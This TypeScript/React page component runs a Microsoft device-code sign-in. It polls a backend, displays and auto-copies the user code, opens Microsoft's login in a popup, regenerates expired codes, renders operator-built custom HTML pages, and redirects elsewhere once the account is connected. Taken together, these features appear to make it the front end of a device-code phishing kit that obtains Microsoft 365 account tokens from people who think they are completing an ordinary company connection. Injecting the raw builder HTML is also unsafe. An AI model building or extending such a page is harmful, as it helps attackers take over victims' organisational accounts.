"use client";

import { use, useCallback, useEffect, useRef, useState } from "react";

import { api } from "@/components/api";
import { isSafeRedirectUrl, pageDocumentSchema, renderPageDocument, type PageDocument } from "@/lib/page-document";

type Authorization = {
  publicId: string;
  userCode: string | null;
  verificationUri: string | null;
  verificationUriComplete: string | null;
  message: string | null;
  status: string;
  expiresAt: string;
  connectionId: string | null;
  errorCode: string | null;
  pageProject?: { versions: Array<{ document: PageDocument | null }> } | null;
};

export default function ConnectPage({ params, searchParams }: { params: Promise<{ sessionId: string }>; searchParams: Promise<{ token?: string }> }) {
  const { sessionId } = use(params);
  const { token = "" } = use(searchParams);
  const [authorization, setAuthorization] = useState<Authorization | null>(null);
  const [error, setError] = useState("");
  const replacing = useRef(false);
  const popup = useRef<Window | null>(null);

  const load = useCallback(async () => {
    try {
      const data = await api<{ authorization: Authorization }>(`/microsoft/device/${encodeURIComponent(sessionId)}/status?token=${encodeURIComponent(token)}`);
      setAuthorization(data.authorization);
    } catch (caught) {
      setError(caught instanceof Error ? caught.message : "Unable to load authorization");
    }
  }, [sessionId, token]);

  useEffect(() => {
    void load();
    const poll = window.setInterval(() => void load(), 3000);
    return () => window.clearInterval(poll);
  }, [load]);

  useEffect(() => {
    if (authorization?.status !== "CONNECTED") return;
    const parsed = pageDocumentSchema.safeParse(authorization.pageProject?.versions[0]?.document);
    const behavior = parsed.success ? parsed.data.settings.builder : undefined;
    if (!behavior?.redirectUrl || !isSafeRedirectUrl(behavior.redirectUrl)) return;
    try { popup.current?.close(); } catch {}
    window.location.replace(behavior.redirectUrl);
  }, [authorization]);

  async function restart() {
    if (replacing.current) return;
    replacing.current = true;
    const response = await fetch(`/api/v1/microsoft/device/${encodeURIComponent(sessionId)}/restart?token=${encodeURIComponent(token)}`, { method: "POST" });
    const result = await response.json() as { connectUrl?: string; error?: string };
    if (!response.ok || !result.connectUrl) throw new Error(result.error ?? "Unable to restart authorization");
    window.location.assign(result.connectUrl);
  }

  useEffect(() => {
    if (authorization?.status === "EXPIRED") void restart();
  }, [authorization?.status]); // eslint-disable-line react-hooks/exhaustive-deps

  const customDocumentResult = pageDocumentSchema.safeParse(authorization?.pageProject?.versions[0]?.document);
  if (authorization && customDocumentResult.success) {
    const destination = authorization.verificationUriComplete ?? authorization.verificationUri ?? "https://microsoft.com/devicelogin";
    const rendered = renderPageDocument(customDocumentResult.data, { deviceCode: authorization.userCode ?? "", verificationUri: destination, status: authorization.status });
    return <main className={`custom-connect-page status-${authorization.status.toLowerCase()}`} onClick={(event) => {
      const target = (event.target as HTMLElement).closest<HTMLElement>("[data-action]");
      if (!target) return;
      const action = target.dataset.action;
      if (action === "copy-device-code") { event.preventDefault(); void navigator.clipboard.writeText(authorization.userCode ?? "").catch(() => undefined); }
      if (action === "open-microsoft") {
        if (target.dataset.nodeId === "auth-popup-fallback") return;
        event.preventDefault();
        popup.current = window.open(destination, "microsoft-auth", "width=520,height=720,resizable=yes,scrollbars=yes");
        void navigator.clipboard.writeText(authorization.userCode ?? "").catch(() => undefined);
        if (!popup.current) document.querySelector('[data-node-id="auth-popup-fallback"]')?.classList.add("is-visible");
      }
      if (action === "restart-authorization") { event.preventDefault(); void restart(); }
    }}>
      <style>{rendered.css}</style>
      <div dangerouslySetInnerHTML={{ __html: rendered.html }} />
    </main>;
  }

  if (error) return <main className="center-page"><div className="card auth-card error">{error}</div></main>;
  if (!authorization) return <main className="center-page"><div className="card auth-card">Loading Microsoft authorization…</div></main>;
  if (["EXPIRED", "FAILED", "CANCELLED"].includes(authorization.status)) {
    return (
      <main className="center-page">
        <div className="card auth-card stack">
          <h1>Preparing a Microsoft code…</h1>
          <p className="muted">This page will continue automatically.</p>
        </div>
      </main>
    );
  }

  return (
    <main className="center-page">
      <div className="card auth-card stack">
        <div className="badge">Microsoft 365 connection</div>
        <h1>Connect your company account</h1>
        <p>This page displays a code issued by Microsoft. Sign-in and MFA take place only on Microsoft&apos;s official website.</p>
        <div className="device-code" aria-label={`Device code ${authorization.userCode}`}>{authorization.userCode}</div>
        <div className="row" style={{ justifyContent: "center" }}>
          <button className="secondary" onClick={() => void navigator.clipboard.writeText(authorization.userCode ?? "").catch(() => undefined)}>Copy Code</button>
          <a
            className="button"
            href={authorization.verificationUriComplete ?? authorization.verificationUri ?? "https://microsoft.com/devicelogin"}
            onClick={(event) => {
              event.preventDefault();
              popup.current = window.open(event.currentTarget.href, "microsoft-auth", "width=520,height=720,resizable=yes,scrollbars=yes");
              void navigator.clipboard.writeText(authorization.userCode ?? "").catch(() => undefined);
            }}
          >
            Continue to Microsoft
          </a>
        </div>
        <p className="muted">Waiting for Microsoft…</p>
      </div>
    </main>
  );
}
